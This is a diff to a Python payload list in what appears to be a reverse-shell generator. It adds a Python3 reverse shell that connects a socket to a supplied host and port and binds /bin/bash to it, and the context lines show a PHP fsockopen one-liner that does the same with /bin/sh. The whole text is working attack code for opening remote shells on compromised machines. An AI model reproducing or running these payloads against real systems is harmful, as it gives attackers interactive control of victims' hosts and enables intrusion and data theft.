@@ -265,6 +265,12 @@ payloads = [
                 'function': {'function_name': oneliner}
             },
             {
+                'title': 'Python3 file embed',
+                'payload': 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
                 'title': 'PHP Oneliner',
                 'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
                     host=args.host, port=args.port),
